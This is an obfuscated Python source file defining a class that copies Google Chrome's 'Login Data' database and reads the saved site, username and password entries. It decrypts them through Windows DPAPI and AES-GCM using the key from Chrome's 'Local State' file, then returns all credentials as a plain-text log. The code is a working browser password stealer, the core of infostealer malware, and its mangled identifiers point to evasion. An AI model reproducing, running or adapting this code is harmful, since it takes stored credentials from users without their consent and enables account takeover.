import os #line:1
import sys #line:2
import shutil #line:3
import sqlite3 #line:4
import json ,base64 #line:5
from cryptography .hazmat .backends import default_backend #line:7
from cryptography .hazmat .primitives .ciphers import (Cipher ,algorithms ,modes )#line:8
class Qzec :#line:10
    def __init__ (OO00O0OO0000O00O0 ):#line:11
        OO00O0OO0000O00O0 .passwordlog =""#line:12
        OO00O0OO0000O00O0 .APP_DATA_PATH =os .environ ['LOCALAPPDATA']#line:13
        OO00O0OO0000O00O0 .DB_PATH =r'Google\Chrome\User Data\Default\Login Data'#line:14
        OO00O0OO0000O00O0 .NONCE_BYTE_SIZE =12 #line:15
    def start (OO0000O000O00O0OO ):#line:17
        _O00OO0OOOOO0OO0OO =os .path .join (OO0000O000O00O0OO .APP_DATA_PATH ,OO0000O000O00O0OO .DB_PATH )#line:18
        _OO000O0OOO00OO00O =os .path .join (OO0000O000O00O0OO .APP_DATA_PATH ,'sqlite_file')#line:19
        if os .path .exists (_OO000O0OOO00OO00O ):#line:20
            os .remove (_OO000O0OOO00OO00O )#line:21
        shutil .copyfile (_O00OO0OOOOO0OO0OO ,_OO000O0OOO00OO00O )#line:22
        OO0000O000O00O0OO .show_password (_OO000O0OOO00OO00O )#line:23
        return OO0000O000O00O0OO .passwordlog #line:24
    def show_password (O0OO0OO00OO000000 ,OOOOOOOOOOO0OO00O ):#line:26
        O0OO00OO000O000O0 =sqlite3 .connect (OOOOOOOOOOO0OO00O )#line:27
        _O0000000O00000O00 ='select signon_realm,username_value,password_value from logins'#line:28
        for OO0OOO000O0O00OOO in O0OO00OO000O000O0 .execute (_O0000000O00000O00 ):#line:29
            O0O000O0O00OO0O0O =OO0OOO000O0O00OOO [0 ]#line:30
            if O0O000O0O00OO0O0O .startswith ('android'):#line:31
                continue #line:32
            OO000O0OO0O00O00O =OO0OOO000O0O00OOO [1 ]#line:33
            O0OOOOOOO0O0OO00O =O0OO0OO00OO000000 .chrome_decrypt (OO0OOO000O0O00OOO [2 ])#line:34
            _OOO0O000OO0OOOOOO ='Site: %s\nUsername: %s\nPassword: %s\n\n'%(O0O000O0O00OO0O0O ,OO000O0OO0O00O00O ,O0OOOOOOO0O0OO00O )#line:35
            O0OO0OO00OO000000 .passwordlog +=_OOO0O000OO0OOOOOO #line:36
        O0OO00OO000O000O0 .close ()#line:37
        os .remove (OOOOOOOOOOO0OO00O )#line:38
    def chrome_decrypt (O00OO0O0OOO000OOO ,O000OOO0O0OOO0OO0 ):#line:40
        if sys .platform =='win32':#line:41
            try :#line:42
                if O000OOO0O0OOO0OO0 [:4 ]==b'\x01\x00\x00\x00':#line:43
                    OO0O00OOO0O0OOO00 =O00OO0O0OOO000OOO .dpapi_decrypt (O000OOO0O0OOO0OO0 )#line:44
                    return OO0O00OOO0O0OOO00 .decode ()#line:45
                elif O000OOO0O0OOO0OO0 [:3 ]==b'v10':#line:46
                    OO0O00OOO0O0OOO00 =O00OO0O0OOO000OOO .aes_decrypt (O000OOO0O0OOO0OO0 )#line:47
                    return OO0O00OOO0O0OOO00 [:-16 ].decode ()#line:48
            except WindowsError :#line:49
                return None #line:50
        else :#line:51
            try :#line:52
                return unix_decrypt (O000OOO0O0OOO0OO0 )#line:53
            except NotImplementedError :#line:54
                return None #line:55
    def encrypt (OO00000OOOO00OOO0 ,OOO000OO0000000O0 ,O0O00O0OO0OOOOO0O ,O0OO0OO0O0O000O00 ):#line:57
        OOO000OO0000000O0 .mode =modes .GCM (O0OO0OO0O0O000O00 )#line:58
        OOO00O0OOO00OO0O0 =OOO000OO0000000O0 .encryptor ()#line:59
        O0OOOOOOOO0OOOOOO =OOO00O0OOO00OO0O0 .update (O0O00O0OO0OOOOO0O )#line:60
        return (OOO000OO0000000O0 ,O0OOOOOOOO0OOOOOO ,O0OO0OO0O0O000O00 )#line:61
    def decrypt (OOOO000OOO0OOOO0O ,O0OOO00000OO0OO0O ,O0O0O00OO0OO0OO0O ,OO0OO000O0O000000 ):#line:63
        O0OOO00000OO0OO0O .mode =modes .GCM (OO0OO000O0O000000 )#line:64
        O00O0000OOO00OOO0 =O0OOO00000OO0OO0O .decryptor ()#line:65
        return O00O0000OOO00OOO0 .update (O0O0O00OO0OO0OO0O )#line:66
    def get_cipher (OO00OO0000OOO0O0O ,O0O0OO000OOOOO0O0 ):#line:68
        O000O00OO0OOOO000 =Cipher (algorithms .AES (O0O0OO000OOOOO0O0 ),None ,backend =default_backend ())#line:73
        return O000O00OO0OOOO000 #line:74
    def dpapi_decrypt (O000OOOO0O0O00O00 ,OOOO0OO00000O0000 ):#line:76
        import ctypes #line:77
        import ctypes .wintypes #line:78
        class OOO0O0OO000OO0OO0 (ctypes .Structure ):#line:80
            _fields_ =[('cbData',ctypes .wintypes .DWORD ),('pbData',ctypes .POINTER (ctypes .c_char ))]#line:82
        O0OOO000OO00OO00O =ctypes .create_string_buffer (OOOO0OO00000O0000 ,len (OOOO0OO00000O0000 ))#line:84
        O00000OO0O00OO00O =OOO0O0OO000OO0OO0 (ctypes .sizeof (O0OOO000OO00OO00O ),O0OOO000OO00OO00O )#line:85
        OO0000O00000OOO00 =OOO0O0OO000OO0OO0 ()#line:86
        O0O0OOO0OO00OOO00 =ctypes .windll .crypt32 .CryptUnprotectData (ctypes .byref (O00000OO0O00OO00O ),None ,None ,None ,None ,0 ,ctypes .byref (OO0000O00000OOO00 ))#line:88
        if not O0O0OOO0OO00OOO00 :#line:89
            raise ctypes .WinError ()#line:90
        O0O0OOO000O0OO00O =ctypes .string_at (OO0000O00000OOO00 .pbData ,OO0000O00000OOO00 .cbData )#line:91
        ctypes .windll .kernel32 .LocalFree (OO0000O00000OOO00 .pbData )#line:92
        return O0O0OOO000O0OO00O #line:93
    def unix_decrypt (O0O0OO0OO0O0OOOOO ,OO00O0OOOOOOOO0O0 ):#line:95
        if sys .platform .startswith ('linux'):#line:96
            O00OOO0OOO0O00OOO ='peanuts'#line:97
            O000OOO00OO00000O =1 #line:98
        else :#line:99
            raise NotImplementedError #line:100
        from Crypto .Cipher import AES #line:102
        from Crypto .Protocol .KDF import PBKDF2 #line:103
        O0O00OO0000OOOOO0 ='saltysalt'#line:105
        OO0OOOOOOOOOO00O0 =' '*16 #line:106
        OOO0OO0OO0O000OOO =16 #line:107
        OO0O0000O0000000O =PBKDF2 (O00OOO0OOO0O00OOO ,O0O00OO0000OOOOO0 ,OOO0OO0OO0O000OOO ,O000OOO00OO00000O )#line:108
        OO0000OO0O00OOO00 =AES .new (OO0O0000O0000000O ,AES .MODE_CBC ,IV =OO0OOOOOOOOOO00O0 )#line:109
        O00OO0O00O0OOO000 =OO0000OO0O00OOO00 .decrypt (OO00O0OOOOOOOO0O0 [3 :])#line:110
        return O00OO0O00O0OOO000 [:-ord (O00OO0O00O0OOO000 [-1 ])]#line:111
    def get_key_from_local_state (OO0000OOO0O0OO000 ):#line:113
        OO000OO0000O0O000 =None #line:114
        with open (os .path .join (os .environ ['LOCALAPPDATA'],r"Google\Chrome\User Data\Local State"),encoding ='utf-8',mode ="r")as OO0O00O00000O00OO :#line:115
            OO000OO0000O0O000 =json .loads (str (OO0O00O00000O00OO .readline ()))#line:116
        return OO000OO0000O0O000 ["os_crypt"]["encrypted_key"]#line:117
    def aes_decrypt (OO000OO0O00O00O0O ,OO00OO00O000OO000 ):#line:119
        O0OOOOOO0OOO0OO00 =OO000OO0O00O00O0O .get_key_from_local_state ()#line:120
        OOO00OO0O000OO00O =base64 .b64decode (O0OOOOOO0OOO0OO00 .encode ())#line:121
        OOO00OO0O000OO00O =OOO00OO0O000OO00O [5 :]#line:122
        O0OO00O0OO0OOO000 =OO000OO0O00O00O0O .dpapi_decrypt (OOO00OO0O000OO00O )#line:123
        O00000000OO00000O =OO00OO00O000OO000 [3 :15 ]#line:124
        O0O00OO00000000OO =OO000OO0O00O00O0O .get_cipher (O0OO00O0OO0OOO000 )#line:125
        return OO000OO0O00O00O0O .decrypt (O0O00OO00000000OO ,OO00OO00O000OO000 [15 :],O00000000OO00000O )